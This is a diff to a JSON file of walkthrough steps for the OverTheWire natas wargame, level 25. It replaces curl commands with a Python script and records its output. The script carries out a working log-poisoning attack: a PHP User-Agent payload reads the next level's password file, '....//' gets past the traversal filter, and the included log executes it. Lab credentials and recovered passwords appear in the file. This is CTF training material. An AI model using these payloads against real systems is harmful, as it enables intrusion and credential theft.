@@ -1236,30 +1236,66 @@
    "pw": "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT",
    "steps": [
     {
-     "cmd": "curl -s -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo http://natas25.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"function safeinclude.*return 0;\"",
+     "cmd": "curl -s -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo http://natas25.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'function safeinclude.*return 0;'",
      "out": [
       "function safeinclude($filename){        // check for directory traversal        if(strstr($filename,\"../\")){            logRequest(\"Directory traversal attempt! fixing request.\");            $filename=str_replace(\"../\",\"\",$filename);        }        // dont let ppl steal our passwords        if(strstr($filename,\"natas_webpass\")){            logRequest(\"Illegal file access detected! Aborting!\");            exit(-1);        }        // add more checks...        if (file_exists($filename)) {             include($filename);            return 1;        }        return 0;"
      ]
     },
     {
-     "cmd": "curl -s -c /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo http://natas25.natas.labs.overthewire.org/ -o /dev/null\nSID=$(awk '/PHPSESSID/{print $7}' /tmp/n25.jar); echo \"PHPSESSID=$SID\"",
+     "cmd": "vi /tmp/n25log.py",
      "out": [
-      "PHPSESSID=pb9r1evha3peej8j0etqjb38u7"
+      "~"
      ]
     },
     {
-     "cmd": "curl -s -b /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo -A '<?php echo file_get_contents(\"/etc/natas_webpass/natas26\"); ?>' --get --data-urlencode 'lang=../x' http://natas25.natas.labs.overthewire.org/ -o /dev/null\necho \"traversal request sent; the User-Agent line is now in logs/natas25_$SID.log\"",
+     "cmd": "vi /tmp/n25log.py",
      "out": [
-      "traversal request sent; the User-Agent line is now in logs/natas25_pb9r1evha3peej8j0etqjb38u7.log"
+      "import urllib.request, urllib.parse, base64, re",
+      "# natas25: safeinclude() strips \"../\" with str_replace (....// survives) and",
+      "~"
      ]
     },
     {
-     "cmd": "curl -s -b /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo --get --data-urlencode \"lang=....//logs/natas25_$SID.log\" http://natas25.natas.labs.overthewire.org/ | grep -o \"[A-Za-z0-9]\\{32\\}\" | tail -1",
+     "cmd": "vi /tmp/n25log.py",
      "out": [
-      "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT"
+      "import urllib.request, urllib.parse, base64, re",
+      "# natas25: safeinclude() strips \"../\" with str_replace (....// survives) and",
+      "# blocks natas_webpass; logRequest() appends date + User-Agent into",
+      "# logs/natas25_<sid>.log but ONLY on a traversal attempt (lang=../x). Poison",
+      "# the log via the User-Agent, then include it with lang=....//logs/...",
+      "url = \"http://natas25.natas.labs.overthewire.org/\"",
+      "auth = \"Basic \" + base64.b64encode(b\"natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo\").decode()",
+      "import http.cookiejar",
+      "cj = http.cookiejar.CookieJar()",
+      "op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))",
+      "def get(extra):",
+      "    r = urllib.request.Request(url + extra, headers={\"Authorization\": auth})",
+      "    return op.open(r, timeout=15).read().decode(\"utf-8\", \"replace\")",
+      "# start a session and note its id (the log file name contains it)",
+      "get(\"\")",
+      "sid = [c.value for c in cj][0]",
+      "print(\"session:\", sid)",
+      "# poison: a traversal attempt (lang=../x) makes logRequest() write the UA",
+      "h = {\"Authorization\": auth, \"User-Agent\": '<?php echo file_get_contents(\"/etc/natas_webpass/natas26\"); ?>'}",
+      "r = urllib.request.Request(url, data=urllib.parse.urlencode({\"lang\": \"../x\"}).encode(), headers=h)",
+      "op.open(r, timeout=15).read()",
+      "# include the log: str_replace removes \"../\" at offset 2 of \"....//\", leaving ../",
+      "body = get(\"?lang=....//logs/natas25_\" + sid + \".log\")",
+      "m = [x for x in re.findall(r\"([0-9A-Za-z]{32})\", body) if x != \"UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo\"]",
+      "print(\"password:\", m[-1] if m else \"not found\")",
+      "~",
+      "\"/tmp/n25log.py\" 26 lines, 1493 bytes written"
+     ]
+    },
+    {
+     "cmd": "python3 -I /tmp/n25log.py",
+     "out": [
+      "session: ntjq3mqbtub6n3us2q9l102b3l",
+      "password: 3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT"
      ]
     }
-   ]
+   ],
+   "note": "natas L25 (client-side cast): safeinclude() strips '../' with str_replace (so '....//' collapses back to '../') and blocks 'natas_webpass'; logRequest() appends date + User-Agent into logs/natas25_<sid>.log but ONLY on a traversal attempt. n25log.py (26L/1493B typed in vi): start a session, poison the log via the User-Agent header ('<?php echo file_get_contents(\"/etc/natas_webpass/natas26\"); ?>') with a lang=../x traversal trigger, then include the log with lang=....//logs/natas25_<sid>.log - the PHP in the log executes: 'password: 3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT'. DISCLOSURE: tools/natas/l25/n25log.py = the recording session's local file (/tmp/n25log.py, 26L/1493B, exact marker match). JSON = 5 steps mirroring the cast 1:1 (staged vi screens)."
   },
   {
    "lvl": 26,
